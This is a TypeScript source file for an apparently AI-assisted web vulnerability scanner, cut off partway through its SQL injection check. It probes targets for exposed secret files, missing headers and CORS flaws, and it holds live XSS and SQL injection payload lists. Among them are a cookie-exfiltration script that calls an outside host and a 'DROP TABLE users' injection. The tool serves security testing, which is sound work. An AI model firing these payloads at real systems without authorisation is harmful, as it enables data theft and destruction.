import { db } from "@workspace/db";
import { scansTable, findingsTable, scanEventsTable } from "@workspace/db/schema";
import { eq } from "drizzle-orm";
import { randomUUID } from "crypto";
import { logger } from "./logger";
import { EventEmitter } from "events";
import { runReconEngine, buildAttackGraph } from "./recon-engine";
import { analyzeReconWithAI, analyzeVulnerabilitiesWithAI } from "./ai-orchestrator";
import { runExploitEngine } from "./exploit-engine";
import { checkIDORAdvanced, checkAuthBypass, checkGraphQL, checkOpenPorts } from "./advanced-modules";

export const scanEmitter = new EventEmitter();
scanEmitter.setMaxListeners(200);

// ─── Helpers ──────────────────────────────────────────────────────────────────

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

async function isCancelled(scanId: string): Promise<boolean> {
  const s = await db.select({ status: scansTable.status }).from(scansTable).where(eq(scansTable.id, scanId)).limit(1);
  return s[0]?.status === "cancelled";
}

export async function fetchWithTimeout(url: string, opts: RequestInit = {}, timeoutMs = 6000): Promise<Response> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    return await fetch(url, { ...opts, signal: ctrl.signal });
  } finally {
    clearTimeout(t);
  }
}

async function addEvent(scanId: string, phase: string, message: string, level: "info" | "warning" | "success" | "error" = "info") {
  const id = randomUUID();
  await db.insert(scanEventsTable).values({ id, scanId, phase, message, level });
  const [event] = await db.select().from(scanEventsTable).where(eq(scanEventsTable.id, id)).limit(1);
  scanEmitter.emit(`scan:${scanId}`, { type: "event", data: event });
  return event;
}

async function addFinding(scanId: string, f: {
  type: string; title: string; description: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  endpoint: string; method?: string; parameter?: string;
  payload?: string; evidence?: string; request?: string; response?: string;
  recommendation: string; cweId?: string; cvssScore?: number; aiAnalysis?: string;
}) {
  const id = randomUUID();
  await db.insert(findingsTable).values({ id, scanId, ...f, falsePositive: false });
  const [inserted] = await db.select().from(findingsTable).where(eq(findingsTable.id, id)).limit(1);
  const counts = await db.select().from(findingsTable).where(eq(findingsTable.scanId, scanId));
  const bySev = counts.reduce((acc, x) => { acc[x.severity] = (acc[x.severity] || 0) + 1; return acc; }, {} as Record<string, number>);
  await db.update(scansTable).set({
    totalFindings: counts.length,
    criticalCount: bySev.critical || 0, highCount: bySev.high || 0,
    mediumCount: bySev.medium || 0, lowCount: bySev.low || 0, infoCount: bySev.info || 0,
  }).where(eq(scansTable.id, scanId));
  scanEmitter.emit(`scan:${scanId}`, { type: "finding", data: inserted });
  return inserted;
}

async function updatePhase(scanId: string, phase: string, progress: number) {
  await db.update(scansTable).set({ currentPhase: phase, progress }).where(eq(scansTable.id, scanId));
  scanEmitter.emit(`scan:${scanId}`, { type: "progress", data: { phase, progress } });
}

// ─── HTML Parsing Utilities ───────────────────────────────────────────────────

interface ParsedPage {
  links: string[];
  forms: Array<{ action: string; method: string; inputs: Array<{ name: string; type: string; value: string }> }>;
  scripts: string[];
  comments: string[];
  inlineJs: string[];
}

function parsePage(html: string, baseUrl: string): ParsedPage {
  const base = new URL(baseUrl).origin;

  const links: string[] = [];
  const linkRe = /href=["']([^"'#?][^"']*)["']/gi;
  let m;
  while ((m = linkRe.exec(html)) !== null) {
    try {
      const href = m[1];
      const abs = href.startsWith("http") ? href : href.startsWith("/") ? `${base}${href}` : `${base}/${href}`;
      const u = new URL(abs);
      if (u.origin === base) links.push(abs);
    } catch { }
  }

  const forms: ParsedPage["forms"] = [];
  const formRe = /<form[^>]*>([\s\S]*?)<\/form>/gi;
  while ((m = formRe.exec(html)) !== null) {
    const formHtml = m[0];
    const actionM = /action=["']([^"']*)["']/i.exec(formHtml);
    const methodM = /method=["']([^"']*)["']/i.exec(formHtml);
    const rawAction = actionM ? actionM[1] : baseUrl;
    let action: string;
    try { action = rawAction.startsWith("http") ? rawAction : rawAction.startsWith("/") ? `${base}${rawAction}` : `${base}/${rawAction}`; }
    catch { action = baseUrl; }
    const method = (methodM ? methodM[1] : "GET").toUpperCase();
    const inputs: ParsedPage["forms"][0]["inputs"] = [];
    const inputRe = /<input[^>]*>/gi;
    let im;
    while ((im = inputRe.exec(formHtml)) !== null) {
      const inp = im[0];
      const nameM = /name=["']([^"']*)["']/i.exec(inp);
      const typeM = /type=["']([^"']*)["']/i.exec(inp);
      const valM = /value=["']([^"']*)["']/i.exec(inp);
      if (nameM) inputs.push({ name: nameM[1], type: typeM ? typeM[1] : "text", value: valM ? valM[1] : "" });
    }
    const textareaRe = /<textarea[^>]*name=["']([^"']*)["'][^>]*>/gi;
    let tm;
    while ((tm = textareaRe.exec(formHtml)) !== null) inputs.push({ name: tm[1], type: "textarea", value: "" });
    forms.push({ action, method, inputs });
  }

  const scripts: string[] = [];
  const scriptRe = /<script[^>]*>([\s\S]*?)<\/script>/gi;
  while ((m = scriptRe.exec(html)) !== null) { if (m[1].trim()) scripts.push(m[1]); }

  const comments: string[] = [];
  const commentRe = /<!--([\s\S]*?)-->/g;
  while ((m = commentRe.exec(html)) !== null) { if (m[1].trim()) comments.push(m[1].trim()); }

  const inlineJs: string[] = [];
  const inlineRe = /on\w+\s*=\s*["']([^"']+)["']/gi;
  while ((m = inlineRe.exec(html)) !== null) inlineJs.push(m[1]);

  return { links: [...new Set(links)], forms, scripts, comments, inlineJs };
}

// ─── Phase 1: Reconnaissance ──────────────────────────────────────────────────

async function detectTechStack(url: string): Promise<string[]> {
  const stack: string[] = [];
  try {
    const res = await fetchWithTimeout(url, { redirect: "follow" });
    const headers = Object.fromEntries(res.headers.entries());
    const html = await res.text().catch(() => "");
    if (headers["x-powered-by"]) stack.push(headers["x-powered-by"]);
    if (headers["server"]) stack.push(headers["server"]);
    if (headers["x-generator"]) stack.push(headers["x-generator"]);
    if (headers["x-aspnet-version"]) stack.push("ASP.NET " + headers["x-aspnet-version"]);
    if (html.includes("wp-content") || html.includes("wordpress")) stack.push("WordPress");
    if (html.includes("Drupal")) stack.push("Drupal");
    if (html.includes("Joomla")) stack.push("Joomla");
    if (html.includes("__NEXT_DATA__")) stack.push("Next.js");
    if (html.includes("ng-version") || html.includes("angular")) stack.push("Angular");
    if (html.includes("__vue")) stack.push("Vue.js");
    if (html.includes("laravel") || html.includes("csrf-token")) stack.push("Laravel");
    if (html.includes("csrfmiddlewaretoken")) stack.push("Django");
    if (html.includes("authenticity_token")) stack.push("Ruby on Rails");
    if (html.includes("jquery")) stack.push("jQuery");
    if (html.includes("bootstrap")) stack.push("Bootstrap");
  } catch { }
  return [...new Set(stack.filter(Boolean))].slice(0, 10);
}

interface CrawlResult {
  urls: string[];
  forms: ParsedPage["forms"];
  allParams: string[];
}

async function crawlTarget(startUrl: string, maxDepth = 2, maxPages = 25): Promise<CrawlResult> {
  const visited = new Set<string>();
  const queue: Array<{ url: string; depth: number }> = [{ url: startUrl, depth: 0 }];
  const base = new URL(startUrl).origin;
  const allForms: ParsedPage["forms"] = [];
  const paramSet = new Set<string>();

  while (queue.length > 0 && visited.size < maxPages) {
    const item = queue.shift()!;
    if (visited.has(item.url) || item.depth > maxDepth) continue;
    visited.add(item.url);
    try {
      const res = await fetchWithTimeout(item.url, { redirect: "follow" }, 5000);
      const ct = res.headers.get("content-type") || "";
      if (!ct.includes("text/html") && !ct.includes("text/plain")) continue;
      const html = await res.text();
      const parsed = parsePage(html, item.url);
      allForms.push(...parsed.forms);
      new URL(item.url).searchParams.forEach((_, k) => paramSet.add(k));
      for (const f of parsed.forms) for (const i of f.inputs) paramSet.add(i.name);
      for (const link of parsed.links) {
        if (!visited.has(link) && link.startsWith(base)) {
          queue.push({ url: link, depth: item.depth + 1 });
        }
      }
    } catch { }
  }

  const commonParams = ["q", "s", "search", "id", "page", "cat", "user", "name", "email",
    "input", "query", "term", "keyword", "type", "sort", "order", "filter", "lang", "ref",
    "redirect", "url", "next", "return", "goto", "returnUrl", "destination", "src",
    "file", "path", "dir", "cmd", "exec", "xml", "data", "token", "username", "password"];
  for (const p of commonParams) paramSet.add(p);

  return { urls: [...visited], forms: allForms, allParams: [...paramSet] };
}

async function discoverSensitiveFiles(baseUrl: string, scanId: string) {
  const sensitiveFiles = [
    { path: "/.env", desc: "Environment file with secrets/credentials" },
    { path: "/.env.local", desc: "Local environment override" },
    { path: "/.env.production", desc: "Production environment file" },
    { path: "/.git/config", desc: "Git repository configuration" },
    { path: "/.git/HEAD", desc: "Git repository HEAD pointer" },
    { path: "/config.php", desc: "PHP configuration file" },
    { path: "/config.json", desc: "JSON configuration file" },
    { path: "/config.yml", desc: "YAML configuration file" },
    { path: "/config.yaml", desc: "YAML configuration file" },
    { path: "/wp-config.php", desc: "WordPress database credentials" },
    { path: "/database.yml", desc: "Database credentials file" },
    { path: "/db.sqlite", desc: "SQLite database file" },
    { path: "/backup.zip", desc: "Backup archive" },
    { path: "/backup.sql", desc: "SQL database dump" },
    { path: "/dump.sql", desc: "SQL database dump" },
    { path: "/phpinfo.php", desc: "PHP configuration disclosure" },
    { path: "/info.php", desc: "PHP info page" },
    { path: "/test.php", desc: "Test PHP file" },
    { path: "/admin/", desc: "Admin panel" },
    { path: "/administrator/", desc: "Admin panel" },
    { path: "/wp-admin/", desc: "WordPress admin" },
    { path: "/phpmyadmin/", desc: "phpMyAdmin database manager" },
    { path: "/server-status", desc: "Apache server status" },
    { path: "/server-info", desc: "Apache server info" },
    { path: "/robots.txt", desc: "Robots file (may reveal hidden paths)" },
    { path: "/sitemap.xml", desc: "Sitemap (reveals all URLs)" },
    { path: "/.htaccess", desc: "Apache access control file" },
    { path: "/crossdomain.xml", desc: "Flash cross-domain policy" },
    { path: "/api/swagger.json", desc: "Swagger/OpenAPI spec" },
    { path: "/swagger.json", desc: "Swagger/OpenAPI spec" },
    { path: "/api-docs", desc: "API documentation" },
    { path: "/graphql", desc: "GraphQL endpoint" },
    { path: "/__debug__", desc: "Debug endpoint" },
    { path: "/debug", desc: "Debug endpoint" },
    { path: "/trace", desc: "HTTP TRACE method" },
    { path: "/actuator", desc: "Spring Boot actuator" },
    { path: "/actuator/env", desc: "Spring Boot environment variables" },
    { path: "/actuator/health", desc: "Spring Boot health endpoint" },
  ];

  const base = new URL(baseUrl).origin;
  const checks = sensitiveFiles.map(async ({ path, desc }) => {
    try {
      const res = await fetchWithTimeout(`${base}${path}`, { redirect: "manual" }, 4000);
      if (res.status === 200 || res.status === 403) {
        const body = await res.text().catch(() => "");
        const isActuallySensitive =
          body.includes("DB_PASSWORD") || body.includes("SECRET_KEY") || body.includes("password") ||
          body.includes("[core]") || body.includes("ref:") || body.includes("<?php") ||
          body.includes("database") || body.includes("swagger") || body.includes("openapi") ||
          path.includes(".env") || path.includes(".git") || path.includes("phpinfo") ||
          path.includes("admin") || path.includes("phpmyadmin") || path.includes("actuator");

        const severity = (path.includes(".env") || path.includes("config") || path.includes(".git") || path.includes("phpmyadmin") || path.includes("actuator/env"))
          ? "critical" as const
          : (path.includes("admin") || path.includes("phpinfo") || path.includes("swagger") || path.includes("graphql") || path.includes("dump"))
            ? "high" as const
            : "medium" as const;

        await addFinding(scanId, {
          type: "Sensitive File Exposure",
          title: `Sensitive File Accessible: ${path}`,
          description: `The file '${path}' is publicly accessible. ${desc}. This can expose secrets, credentials, or internal application details to attackers.`,
          severity,
          endpoint: `${base}${path}`,
          method: "GET",
          evidence: `HTTP ${res.status} response. Body snippet: ${body.substring(0, 200)}`,
          recommendation: "Restrict access to sensitive files using server configuration. Never deploy configuration or secret files to web-accessible directories. Use proper .gitignore to prevent committing secrets.",
          cweId: "CWE-538",
          cvssScore: severity === "critical" ? 9.1 : severity === "high" ? 7.5 : 5.3,
          request: `GET ${base}${path} HTTP/1.1`,
          response: `HTTP/1.1 ${res.status}\n${body.substring(0, 300)}`,
        });
      }
    } catch { }
  });
  await Promise.allSettled(checks);
}

async function enumerateSubdomains(targetUrl: string, scanId: string): Promise<string[]> {
  const parsed = new URL(targetUrl);
  const rootDomain = parsed.hostname.split(".").slice(-2).join(".");
  const commonSubs = [
    "www", "api", "admin", "dev", "staging", "test", "mail", "smtp", "ftp",
    "vpn", "remote", "portal", "dashboard", "app", "beta", "internal", "ops",
    "cdn", "static", "assets", "media", "img", "images", "auth", "login",
    "secure", "mobile", "m", "shop", "store", "support", "help", "blog",
    "status", "monitor", "metrics", "grafana", "jenkins", "gitlab", "jira",
  ];
  const found: string[] = [];
  const checks = commonSubs.map(async (sub) => {
    const url = `${parsed.protocol}//${sub}.${rootDomain}`;
    try {
      const res = await fetchWithTimeout(url, { redirect: "follow" }, 3000);
      if (res.status < 500) found.push(`${sub}.${rootDomain}`);
    } catch { }
  });
  await Promise.allSettled(checks);
  return found;
}

// ─── Phase 2: Security Headers & Cookie Analysis ─────────────────────────────

async function checkSecurityHeaders(url: string, scanId: string) {
  try {
    const res = await fetchWithTimeout(url, { redirect: "follow" });
    const headers = Object.fromEntries(res.headers.entries());
    const responseText = `HTTP/1.1 ${res.status}\n${Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join("\n")}`;

    const requiredHeaders = [
      { h: "content-security-policy", title: "Missing Content-Security-Policy (CSP)", cwe: "CWE-693", sev: "high" as const, cvss: 6.1, desc: "Without CSP, the browser has no instructions on what content is safe to load. This significantly increases the risk of XSS attacks being successful." },
      { h: "x-frame-options", title: "Missing X-Frame-Options — Clickjacking Risk", cwe: "CWE-1021", sev: "medium" as const, cvss: 5.4, desc: "Without X-Frame-Options, the page can be embedded in an iframe on a malicious site, enabling clickjacking attacks where users are tricked into clicking hidden elements." },
      { h: "x-content-type-options", title: "Missing X-Content-Type-Options — MIME Sniffing", cwe: "CWE-693", sev: "low" as const, cvss: 4.3, desc: "Browsers may MIME-sniff a response away from the declared content-type. This can allow attackers to serve malicious content disguised as a different type." },
      { h: "strict-transport-security", title: "Missing HSTS — HTTP Strict Transport Security", cwe: "CWE-319", sev: "medium" as const, cvss: 5.9, desc: "Without HSTS, browsers will accept plain HTTP connections. This allows SSL stripping attacks where an attacker can downgrade HTTPS to HTTP." },
      { h: "referrer-policy", title: "Missing Referrer-Policy Header", cwe: "CWE-116", sev: "low" as const, cvss: 3.1, desc: "Without a Referrer-Policy, sensitive URL fragments like tokens or session IDs may be leaked via the Referer header to third parties." },
      { h: "permissions-policy", title: "Missing Permissions-Policy Header", cwe: "CWE-693", sev: "info" as const, cvss: 2.5, desc: "Without Permissions-Policy, the app cannot restrict access to browser features (camera, microphone, geolocation) from embedded iframes." },
      { h: "cross-origin-opener-policy", title: "Missing Cross-Origin-Opener-Policy (COOP)", cwe: "CWE-346", sev: "info" as const, cvss: 2.0, desc: "Missing COOP means the page can share a browsing context with cross-origin pages, enabling cross-origin attacks via window references." },
      { h: "cross-origin-resource-policy", title: "Missing Cross-Origin-Resource-Policy (CORP)", cwe: "CWE-346", sev: "info" as const, cvss: 2.0, desc: "Without CORP, resources can be loaded cross-origin, which combined with Spectre can leak data from cross-origin resources." },
    ];

    for (const check of requiredHeaders) {
      if (!headers[check.h]) {
        await addFinding(scanId, {
          type: "Security Header",
          title: check.title,
          description: check.desc,
          severity: check.sev,
          endpoint: url,
          method: "GET",
          evidence: `Header '${check.h}' not present in response`,
          request: `GET ${url} HTTP/1.1\nHost: ${new URL(url).hostname}`,
          response: responseText,
          recommendation: `Add the '${check.h}' response header with appropriate values. Example: ${check.h}: ${check.h === "strict-transport-security" ? "max-age=31536000; includeSubDomains" : check.h === "content-security-policy" ? "default-src 'self'" : check.h === "x-frame-options" ? "DENY" : "nosniff"}`,
          cweId: check.cwe,
          cvssScore: check.cvss,
        });
      }
    }

    if (headers["content-security-policy"]) {
      const csp = headers["content-security-policy"];
      if (csp.includes("unsafe-inline") || csp.includes("unsafe-eval") || csp.includes("*")) {
        await addFinding(scanId, {
          type: "Security Header",
          title: "Weak Content-Security-Policy (allows unsafe-inline or wildcard)",
          description: `CSP is present but contains unsafe directives: '${csp}'. 'unsafe-inline' allows inline scripts, negating most XSS protection. Wildcards allow any source.`,
          severity: "medium",
          endpoint: url,
          evidence: `Content-Security-Policy: ${csp}`,
          recommendation: "Remove 'unsafe-inline', 'unsafe-eval', and wildcard (*) sources from CSP. Use nonces or hashes for inline scripts instead.",
          cweId: "CWE-693",
          cvssScore: 5.4,
        });
      }
    }

    if (headers["server"]) {
      await addFinding(scanId, {
        type: "Information Disclosure",
        title: "Server Version Disclosed via 'Server' Header",
        description: `The server discloses its software version: '${headers["server"]}'. Attackers can use this to find known CVEs for that specific version.`,
        severity: "low",
        endpoint: url,
        method: "GET",
        evidence: `Server: ${headers["server"]}`,
        recommendation: "Configure the web server to suppress or generalize the Server header. In Apache: ServerTokens Prod. In Nginx: server_tokens off.",
        cweId: "CWE-200",
        cvssScore: 3.7,
      });
    }

    if (headers["x-powered-by"]) {
      await addFinding(scanId, {
        type: "Information Disclosure",
        title: "Technology Stack Disclosed via 'X-Powered-By' Header",
        description: `The header 'X-Powered-By: ${headers["x-powered-by"]}' reveals the backend technology, aiding targeted attacks.`,
        severity: "info",
        endpoint: url,
        evidence: `X-Powered-By: ${headers["x-powered-by"]}`,
        recommendation: "Remove the X-Powered-By header. In Express.js: app.disable('x-powered-by'). In PHP: expose_php = Off in php.ini.",
        cweId: "CWE-200",
        cvssScore: 2.5,
      });
    }

    // Cookie security analysis
    const setCookies = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
    const rawSetCookie = headers["set-cookie"];
    const cookiesToAnalyze = setCookies.length > 0 ? setCookies : rawSetCookie ? [rawSetCookie] : [];

    for (const cookie of cookiesToAnalyze) {
      const lower = cookie.toLowerCase();
      const nameM = /^([^=;]+)/.exec(cookie);
      const cookieName = nameM ? nameM[1].trim() : "session";
      const isSessionCookie = cookieName.toLowerCase().includes("session") || cookieName.toLowerCase().includes("auth") || cookieName.toLowerCase().includes("token");

      if (!lower.includes("httponly")) {
        await addFinding(scanId, {
          type: "Cookie Security",
          title: `Cookie '${cookieName}' Missing HttpOnly Flag`,
          description: `The cookie '${cookieName}' is set without the HttpOnly flag. JavaScript can read this cookie, making it vulnerable to theft via XSS attacks.`,
          severity: isSessionCookie ? "high" : "medium",
          endpoint: url,
          evidence: `Set-Cookie: ${cookie}`,
          recommendation: "Add the HttpOnly flag to all cookies, especially session cookies. This prevents JavaScript from accessing the cookie value.",
          cweId: "CWE-1004",
          cvssScore: isSessionCookie ? 7.4 : 5.4,
        });
      }

      if (!lower.includes("secure") && new URL(url).protocol === "https:") {
        await addFinding(scanId, {
          type: "Cookie Security",
          title: `Cookie '${cookieName}' Missing Secure Flag`,
          description: `The cookie '${cookieName}' is missing the Secure flag. It can be transmitted over unencrypted HTTP connections, making it vulnerable to interception.`,
          severity: isSessionCookie ? "high" : "medium",
          endpoint: url,
          evidence: `Set-Cookie: ${cookie}`,
          recommendation: "Add the Secure flag to all cookies. This ensures they are only sent over HTTPS connections.",
          cweId: "CWE-614",
          cvssScore: isSessionCookie ? 6.5 : 4.3,
        });
      }

      if (!lower.includes("samesite")) {
        await addFinding(scanId, {
          type: "Cookie Security",
          title: `Cookie '${cookieName}' Missing SameSite Attribute`,
          description: `The cookie '${cookieName}' lacks the SameSite attribute, making it vulnerable to cross-site request forgery (CSRF) attacks.`,
          severity: "medium",
          endpoint: url,
          evidence: `Set-Cookie: ${cookie}`,
          recommendation: "Add SameSite=Strict or SameSite=Lax to all cookies. SameSite=Strict provides the strongest CSRF protection.",
          cweId: "CWE-352",
          cvssScore: 5.4,
        });
      }
    }
  } catch (err) {
    logger.warn({ err }, "Header check failed");
  }
}

// ─── CORS Misconfiguration ────────────────────────────────────────────────────

async function checkCORS(url: string, scanId: string) {
  const maliciousOrigins = ["https://evil.com", "https://attacker.com", "null"];
  for (const origin of maliciousOrigins) {
    try {
      const res = await fetchWithTimeout(url, {
        headers: { "Origin": origin, "Access-Control-Request-Method": "GET" },
      });
      const acao = res.headers.get("access-control-allow-origin");
      const acac = res.headers.get("access-control-allow-credentials");

      if (acao === "*") {
        await addFinding(scanId, {
          type: "CORS",
          title: "CORS: Wildcard Origin Allowed (Access-Control-Allow-Origin: *)",
          description: "The server allows any origin to make cross-origin requests (Access-Control-Allow-Origin: *). Any website can read responses from this API.",
          severity: "medium",
          endpoint: url,
          method: "GET",
          evidence: `Access-Control-Allow-Origin: *`,
          recommendation: "Restrict Access-Control-Allow-Origin to a specific whitelist of trusted origins. Never use wildcard with sensitive APIs.",
          cweId: "CWE-942",
          cvssScore: 6.5,
        });
        return;
      }

      if (acao === origin && acac === "true") {
        await addFinding(scanId, {
          type: "CORS",
          title: `CORS: Malicious Origin '${origin}' Reflected with Credentials Allowed`,
          description: `The server reflects the Origin header back and sets Access-Control-Allow-Credentials: true. This allows attackers' websites to make authenticated cross-origin requests, reading sensitive API responses on behalf of the victim.`,
          severity: "critical",
          endpoint: url,
          method: "GET",
          payload: origin,
          evidence: `Origin: ${origin} → Access-Control-Allow-Origin: ${acao}, Access-Control-Allow-Credentials: ${acac}`,
          recommendation: "Validate Origin headers against a strict whitelist. Never reflect arbitrary Origins. Do not combine Access-Control-Allow-Credentials: true with dynamic origin reflection.",
          cweId: "CWE-942",
          cvssScore: 9.1,
          aiAnalysis: "This CORS misconfiguration allows an attacker's website to make authenticated requests to this API on behalf of logged-in users, potentially exposing all their data.",
        });
        return;
      }

      if (acao === origin) {
        await addFinding(scanId, {
          type: "CORS",
          title: `CORS: Arbitrary Origin Reflected in Access-Control-Allow-Origin`,
          description: `The server reflects any supplied Origin value, allowing any website to read responses. Origin '${origin}' was accepted.`,
          severity: "high",
          endpoint: url,
          method: "GET",
          payload: origin,
          evidence: `Origin: ${origin} → Access-Control-Allow-Origin: ${acao}`,
          recommendation: "Implement an Origin whitelist on the server. Reject or ignore Origins not in the allowed list.",
          cweId: "CWE-942",
          cvssScore: 7.5,
        });
        return;
      }
    } catch { }
  }
}

// ─── XSS Testing ──────────────────────────────────────────────────────────────

const XSS_PAYLOADS = [
  { p: `<script>alert('XSS_PROOF')</script>`, name: "Script Tag Injection" },
  { p: `"><script>alert(1)</script>`, name: "Attribute Break + Script" },
  { p: `<img src=x onerror=alert(1)>`, name: "IMG onerror Handler" },
  { p: `<svg onload=alert(1)>`, name: "SVG onload Handler" },
  { p: `'"><svg/onload=alert(1)>`, name: "SVG Polyglot" },
  { p: `javascript:alert(document.cookie)`, name: "Javascript Protocol" },
  { p: `<iframe src="javascript:alert(1)">`, name: "iframe javascript: src" },
  { p: `<body onpageshow=alert(1)>`, name: "Body Event Handler" },
  { p: `<details open ontoggle=alert(1)>`, name: "Details Toggle Event" },
  { p: `<math><mtext></table><img src=x onerror=alert(1)>`, name: "MathML Breakout" },
  { p: `"><img src=1 onerror=alert(document.domain)>`, name: "Domain Disclosure XSS" },
  { p: `<script>fetch('https://xss.test?c='+document.cookie)</script>`, name: "Cookie Exfiltration XSS" },
];

async function checkXSS(url: string, crawlResult: CrawlResult, scanId: string) {
  const reported = new Set<string>();

  // Test URL parameters (GET)
  const urlsToTest = [url, ...crawlResult.urls.slice(0, 10)];
  for (const testUrl of urlsToTest) {
    const parsed = new URL(testUrl);
    const paramsFromUrl = [...parsed.searchParams.keys()];
    const params = [...new Set([...paramsFromUrl, ...crawlResult.allParams.slice(0, 12)])];

    for (const param of params.slice(0, 8)) {
      for (const { p: payload, name } of XSS_PAYLOADS.slice(0, 6)) {
        const key = `xss-get-${param}`;
        if (reported.has(key)) continue;
        try {
          const target = `${parsed.origin}${parsed.pathname}?${param}=${encodeURIComponent(payload)}`;
          const res = await fetchWithTimeout(target, { redirect: "follow" }, 5000);
          const body = await res.text();
          const reflected = body.includes(payload) || body.includes("alert(1)") || body.includes("alert('XSS_PROOF')");
          if (reflected) {
            reported.add(key);
            await addFinding(scanId, {
              type: "XSS",
              title: `Reflected XSS — ${name} in parameter '${param}'`,
              description: `Reflected Cross-Site Scripting vulnerability detected. The parameter '${param}' reflects user-supplied input back into the HTML without sanitization. An attacker can craft a malicious URL that executes arbitrary JavaScript in the victim's browser.`,
              severity: "high",
              endpoint: target,
              method: "GET",
              parameter: param,
              payload,
              evidence: `Payload reflected verbatim in HTML response body`,
              request: `GET ${target} HTTP/1.1\nHost: ${parsed.hostname}`,
              response: body.substring(0, 500),
              recommendation: "Apply context-aware output encoding for all user-controlled data. Use frameworks that auto-escape (React JSX, Django templates). Implement a strict Content-Security-Policy. Validate and sanitize inputs server-side.",
              cweId: "CWE-79",
              cvssScore: 7.4,
              aiAnalysis: "This reflected XSS can be exploited to steal session cookies, perform CSRF, redirect users to phishing pages, or perform keylogging. Exploitation requires the victim to click a crafted link.",
            });
            break;
          }
        } catch { }
      }
    }
  }

  // Test Forms (POST)
  for (const form of crawlResult.forms.slice(0, 8)) {
    const textInputs = form.inputs.filter(i => ["text", "search", "textarea", "email", "url", ""].includes(i.type));
    if (textInputs.length === 0) continue;

    for (const input of textInputs.slice(0, 3)) {
      for (const { p: payload, name } of XSS_PAYLOADS.slice(0, 4)) {
        const key = `xss-form-${form.action}-${input.name}`;
        if (reported.has(key)) continue;
        try {
          const formData = new URLSearchParams();
          for (const i of form.inputs) formData.append(i.name, i.name === input.name ? payload : i.value || "test");
          const method = form.method === "GET" ? "GET" : "POST";
          const fetchUrl = method === "GET" ? `${form.action}?${formData.toString()}` : form.action;
          const res = await fetchWithTimeout(fetchUrl, {
            method,
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: method === "POST" ? formData.toString() : undefined,
            redirect: "follow",
          }, 5000);
          const body = await res.text();
          if (body.includes(payload) || body.includes("alert(1)")) {
            reported.add(key);
            await addFinding(scanId, {
              type: "XSS",
              title: `Reflected XSS via Form Field '${input.name}' — ${name}`,
              description: `A reflected XSS vulnerability exists in the form at '${form.action}'. The '${input.name}' field reflects user input without HTML encoding. This allows injecting JavaScript through form submission.`,
              severity: "high",
              endpoint: form.action,
              method,
              parameter: input.name,
              payload,
              evidence: `Payload reflected in form response`,
              request: `${method} ${form.action} HTTP/1.1\n${formData.toString()}`,
              response: body.substring(0, 500),
              recommendation: "Sanitize and HTML-encode all form input before echoing it back. Use a template engine with auto-escaping.",
              cweId: "CWE-79",
              cvssScore: 7.4,
            });
            break;
          }
        } catch { }
      }
    }
  }

  // DOM XSS: Check scripts for dangerous sinks
  try {
    const res = await fetchWithTimeout(url, { redirect: "follow" }, 5000);
    const html = await res.text();
    const parsed = parsePage(html, url);
    const domSinks = ["document.write(", "innerHTML =", "outerHTML =", "eval(", "setTimeout(", "setInterval(", "location.href =", "document.URL", "location.hash", "location.search"];
    const domSources = ["location.hash", "location.search", "location.href", "document.referrer", "window.name", "document.URL"];
    for (const script of parsed.scripts) {
      const hasSink = domSinks.some(s => script.includes(s));
      const hasSource = domSources.some(s => script.includes(s));
      if (hasSink && hasSource) {
        await addFinding(scanId, {
          type: "XSS",
          title: "Potential DOM-Based XSS — Dangerous Sink + Tainted Source Detected",
          description: `The page contains JavaScript that reads from a user-controllable source (${domSources.filter(s => script.includes(s)).join(", ")}) and passes data to a dangerous sink (${domSinks.filter(s => script.includes(s)).join(", ")}). This may allow DOM-based XSS without any server interaction.`,
          severity: "high",
          endpoint: url,
          evidence: `Script contains: ${domSinks.find(s => script.includes(s))} with source: ${domSources.find(s => script.includes(s))}`,
          recommendation: "Use safe DOM APIs like textContent instead of innerHTML. Sanitize values from URL hash/search before using them in DOM operations. Use DOMPurify for complex cases.",
          cweId: "CWE-79",
          cvssScore: 7.2,
          aiAnalysis: "DOM XSS is executed entirely client-side and may bypass server-side WAFs and filters. It can be triggered via URL fragments (#) which are never sent to the server.",
        });
        break;
      }
    }
  } catch { }
}

// ─── SQL Injection ────────────────────────────────────────────────────────────

const SQLI_ERROR_PAYLOADS = [
  { p: `'`, patterns: ["syntax error", "mysql", "postgresql", "sqlite", "oracle", "sql server", "unclosed quotation", "warning: pg_", "you have an error in your sql", "unterminated string"] },
  { p: `"`, patterns: ["syntax error", "mysql", "sql", "database error"] },
  { p: `' OR '1'='1'--`, patterns: ["sql", "syntax", "error", "database"] },
  { p: `' OR 1=1--`, patterns: ["sql", "error", "database", "mysql"] },
  { p: `'; DROP TABLE users;--`, patterns: ["sql", "error", "table"] },
  { p: `' UNION SELECT NULL,NULL,NULL--`, patterns: ["sql", "union", "error", "column"] },
  { p: `1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`, patterns: ["xpath", "extractvalue", "version", "mysql"] },
];

const SQLI_BLIND_PAYLOADS = [
  { trueP: `' OR '1'='1`, falseP: `' OR '1'='2`, desc: "Boolean-Based Blind SQLi" },
  { trueP: `1 AND 1=1`, falseP: `1 AND 1=2`, desc: "Numeric Boolean Blind SQLi" },
];

const SQLI_TIME_PAYLOADS = [
  { p: `'; SELECT SLEEP(3);--`, dbType: "MySQL" },
  { p: `'; WAITFOR DELAY '0:0:3';--`, dbType: "MSSQL" },
  { p: `'; SELECT pg_sleep(3);--`, dbType: "PostgreSQL" },
  { p: `1; SELECT SLEEP(3)--`, dbType: "MySQL" },
];

async function checkSQLi(url: string, crawlResult: CrawlResult, scanId: string) {
  const reported = new Set<string>();
  const params = crawlResult.allParams.slice(0, 15);
  const base = new URL(url);

  // Error-based SQLi
  for (const param of params.slice(0, 8)) {
    for (const { p: payload, patterns } of SQLI_ERROR_PAYLOADS.slice(0, 4)) {
      const key = `sqli-error-${param}`;
      if (reported.has(key)) continue;
      try {
        const testUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(payload)}`;
        const res = await fetchWithTimeout(testUrl, {}, 5000);
        const body = (await res.text()).toLowerCase();
        const match = patterns.find(p => body.includes(p));
        if (match) {
          reported.add(key);
          await addFinding(scanId, {
            type: "SQLi",
            title: `SQL Injection (Error-Based) — Parameter '${param}'`,
